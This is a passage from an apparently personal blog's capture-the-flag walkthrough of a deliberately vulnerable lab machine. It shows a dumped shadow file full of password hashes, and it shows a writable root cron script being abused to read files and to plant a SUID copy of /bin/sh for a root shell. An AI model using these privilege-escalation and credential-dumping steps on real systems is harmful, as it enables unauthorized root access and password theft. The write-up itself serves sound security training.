-lololol:!:16292:0:99999:7:::
-overflow:$6$RSQQWzPh$JB3Jm3liSEjq.ytLU2Hr.N6bTUEgkVtW5KSkCzVzvLf7zBT4eHuc0EUeEUPw3v5epKsZ9mLFfurV6gSUtpcZa.:16292:0:99999:7:::
-ps-aux:$6$N8fO8B2w$ABHj.O2jTfIizBfrb0SpgN6VJLDujJ6o9wR4D0b4ZqqlfKQzW1M0xG0uTR4AZW77BFH0rsA2ZxnoGSMdwy3k00:16292:0:99999:7:::
-maleus:$6$Y.Ev9AQx$IS.ikFcKj5.natBbOMMP3GiV9LJDjCQaHuvKoEeA1hPjhss8qLzjVPpuSnKysIF261sSnjOfoFjhpo.rO8qDg.:16292:0:99999:7:::
-felux:$6$t0WWHdf0$9QYd6dc9XuZo.RwMRCdrzuTPTqaCJ47KAS7p1EitR2LVGJsOqjarTxD67WUhLQvmF3KOFIfgvN3rlw7cfU132.:16292:0:99999:7:::
-Eagle11:$6$Pz9WUVEk$PPQQs334rlXCZRRY1w/uullgDaKeIMGNlzUXERsCl7zIrdulDtrcYD74t/mtw0yhqsJJQFXrZ08dpk0gEx0gX1:16292:0:99999:7:::
-genphlux:$6$K2gip8vY$jcbwnoeCKqtu.9IkVbBNDJ3TAV0NcVSWgv2U3uYx1e942dcaD1NhxEpBklKAX1NnnrDCw6SU1Fw7vJ6tmOiCM/:16292:0:99999:7:::
-usmc8892:$6$MlFBCUvT$YS7ZpyXavI6tGgYJW3fPFRbUlV2yhoHGir26minsRRBTTDf60NIwxi7PP3S8/vePYFBVVuSC0kfyBYeMnHnBO1:16292:0:99999:7:::
-blawrg:$6$Pg7SOYWy$Ap9wmycvq0n2iR8CJNKcY/SBUrOqC4Dc8D6whHDnZNp8xqLCB/GF2Et4lHnhHehWkgObxSX5MZWofAc4QQSbj1:16292:0:99999:7:::
-wytshadow:$6$Xw3TqkwY$O2Xx5JXO9DXSyqumRCBWa2fk0Z0glVUNty9nKkms4SlAKMtWwmHvNRHiIClPa4SGvCii0fCi5Xxg6gvoZrXhG0:16292:0:99999:7:::
-vis1t0r:$6$nVShrZJb$ZAZ9nf4vzddUm1ISPO8gKgYweQopjc/Ta7jbEacYbDVOG1g8Y3LHwiJhU2NsDJljkn2Oc4xPJPeMpox5jSBHd0:16292:0:99999:7:::
-root:$6$mdQyunCS$qRhQug5j4xuM2vwsSlFJ0TrAVmfCV5h0VgKjbBp5BN2hL6ySxGL8Tt.qa2GlVotm7DFK7OUG9naqK6Kdf1aEZ.:16292:0:99999:7:::
-daemon:*:16273:0:99999:7:::
-bin:*:16273:0:99999:7:::
-sys:*:16273:0:99999:7:::
-sync:*:16273:0:99999:7:::
-games:*:16273:0:99999:7:::
-man:*:16273:0:99999:7:::
-lp:*:16273:0:99999:7:::
-mail:*:16273:0:99999:7:::
-news:*:16273:0:99999:7:::
-uucp:*:16273:0:99999:7:::
-proxy:*:16273:0:99999:7:::
-www-data:*:16273:0:99999:7:::
-backup:*:16273:0:99999:7:::
-list:*:16273:0:99999:7:::
-irc:*:16273:0:99999:7:::
-gnats:*:16273:0:99999:7:::
-nobody:*:16273:0:99999:7:::
-libuuid:!:16273:0:99999:7:::
-syslog:*:16273:0:99999:7:::
-messagebus:*:16291:0:99999:7:::
-troll:$6$9WnrXzBm$ijsblc.QCK1kTlHCxiH5Dt3eUhZgEVaIpkIifyIx6EmPpD03xmIyPD6l/dVlUAE0Q4jGqaiusEkvb3BEDNcs6.:16292:0:99999:7:::
-sshd:*:16291:0:99999:7:::
-ftp:*:16292:0:99999:7:::
-lololol:!:16292:0:99999:7:::
-overflow:$6$RSQQWzPh$JB3Jm3liSEjq.ytLU2Hr.N6bTUEgkVtW5KSkCzVzvLf7zBT4eHuc0EUeEUPw3v5epKsZ9mLFfurV6gSUtpcZa.:16292:0:99999:7:::
-ps-aux:$6$N8fO8B2w$ABHj.O2jTfIizBfrb0SpgN6VJLDujJ6o9wR4D0b4ZqqlfKQzW1M0xG0uTR4AZW77BFH0rsA2ZxnoGSMdwy3k00:16292:0:99999:7:::
-maleus:$6$Y.Ev9AQx$IS.ikFcKj5.natBbOMMP3GiV9LJDjCQaHuvKoEeA1hPjhss8qLzjVPpuSnKysIF261sSnjOfoFjhpo.rO8qDg.:16292:0:99999:7:::
-felux:$6$t0WWHdf0$9QYd6dc9XuZo.RwMRCdrzuTPTqaCJ47KAS7p1EitR2LVGJsOqjarTxD67WUhLQvmF3KOFIfgvN3rlw7cfU132.:16292:0:99999:7:::
-Eagle11:$6$Pz9WUVEk$PPQQs334rlXCZRRY1w/uullgDaKeIMGNlzUXERsCl7zIrdulDtrcYD74t/mtw0yhqsJJQFXrZ08dpk0gEx0gX1:16292:0:99999:7:::
-genphlux:$6$K2gip8vY$jcbwnoeCKqtu.9IkVbBNDJ3TAV0NcVSWgv2U3uYx1e942dcaD1NhxEpBklKAX1NnnrDCw6SU1Fw7vJ6tmOiCM/:16292:0:99999:7:::
-usmc8892:$6$MlFBCUvT$YS7ZpyXavI6tGgYJW3fPFRbUlV2yhoHGir26minsRRBTTDf60NIwxi7PP3S8/vePYFBVVuSC0kfyBYeMnHnBO1:16292:0:99999:7:::
-blawrg:$6$Pg7SOYWy$Ap9wmycvq0n2iR8CJNKcY/SBUrOqC4Dc8D6whHDnZNp8xqLCB/GF2Et4lHnhHehWkgObxSX5MZWofAc4QQSbj1:16292:0:99999:7:::
-wytshadow:$6$Xw3TqkwY$O2Xx5JXO9DXSyqumRCBWa2fk0Z0glVUNty9nKkms4SlAKMtWwmHvNRHiIClPa4SGvCii0fCi5Xxg6gvoZrXhG0:16292:0:99999:7:::
-vis1t0r:$6$nVShrZJb$ZAZ9nf4vzddUm1ISPO8gKgYweQopjc/Ta7jbEacYbDVOG1g8Y3LHwiJhU2NsDJljkn2Oc4xPJPeMpox5jSBHd0:16292:0:99999:7:::
-</code></p>
-
-<p>But I am not a fan of cracking passwords, if it can be avoided. And in this case, we still have the other Python file to check. So I modified the cleaner code again:</p>
-
-<p>``` python
-with open(&lsquo;/opt/lmao.py&rsquo;, &lsquo;r&rsquo;) as lmao:</p>
-
-<pre><code>lol = lmao.read()
-</code></pre>
-
-<p>with open(&lsquo;/tmp/lol.py&rsquo;, &lsquo;a&rsquo;) as rofl:</p>
-
-<pre><code>rofl.write(lol)
-</code></pre>
-
-<p>```</p>
-
-<p>And after a little bit of waiting, we finally have the culprit that is killing our shells:</p>
-
-<p>``` plain
-$ cat /tmp/lol.py</p>
-
-<h1>!/usr/bin/env python</h1>
-
-<p>import os</p>
-
-<p>os.system(&lsquo;echo &ldquo;TIMES UP LOL!&rdquo;|wall&rsquo;)
-os.system(&ldquo;pkill -u &lsquo;overflow&rsquo;&rdquo;)
-sys.exit()
-```</p>
-
-<p>Ok, now let&rsquo;s finish by getting a shell. We can leverage the cleaner file to copy the shell executable and give it outrageously lax permissions and SUID bit. Note that I&rsquo;m not saying bash, because the shell being used here is the <em>sh</em> shell.</p>
-
-<p><code>plain
-$ echo $SHELL
-/bin/sh
-</code></p>
-
-<p>Here is the simple code for copying the shell file to <em>/tmp/</em> and letting everyone run it with root permissions:</p>
-
-<p>``` python
-import os</p>
-
-<p>os.system(&lsquo;cp /bin/sh /tmp/trolled&rsquo;)
-os.system(&lsquo;chmod 4777 /tmp/trolled&rsquo;)
-```</p>
-
-<p>Now just wait for cron. Check the loot and pwn the troll!</p>
-
-<p>``` plain
-$ ls -l /tmp/trolled
--rwsrwxrwx 1 root root 112204 Feb  3 04:50 /tmp/trolled
-$ /tmp/trolled</p>
-
-<h1>whoami</h1>
-
-<p>root</p>
-
-<h1>ls /root/</h1>
-
-<p>proof.txt</p>
-
-<h1>cat /root/proof.txt</h1>
-
-<p>Good job, you did it!</p>
-
-<p>702a8c18d29c6f3ca0d99ef5712bfbdc
-```</p>
-
-<p>Alternatively, since the original objective was only to read the proof file, you can just use the cleaner file to do it, providing you know the name of the proof file:</p>
-
-<p>``` python
-with open(&lsquo;/root/proof.txt&rsquo;, &lsquo;r&rsquo;) as proof:</p>
-
-<pre><code>win = proof.read()
-</code></pre>
-
-<p>with open(&lsquo;/tmp/proof.txt&rsquo;, &lsquo;a&rsquo;) as pwned:</p>
-
-<pre><code>pwned.write(win)
-</code></pre>
-
-<p>```</p>
-
-<p>And here it is:</p>
-
-<p>``` plain
-$ cat /tmp/proof.txt
-Good job, you did it!</p>
-
-<p>702a8c18d29c6f3ca0d99ef5712bfbdc
-```</p>
-
-<p>Fortune cookie:</p>
-
-<blockquote><p>He that breaks a thing to find out what it is has left the path of wisdom.
-  &mdash; J.R.R. Tolkien</p></blockquote>
-
-<p><strong>Random rant</strong></p>
-
-<p>I started this post in 2014 and completed it in 2015! Who&rsquo;s the troll now?</p>
-
-<p>Been busy and inactive for a couple of months, but I am back now and hopefully without such long pauses between posts.</p>
 ]]></content>
   </entry>
   
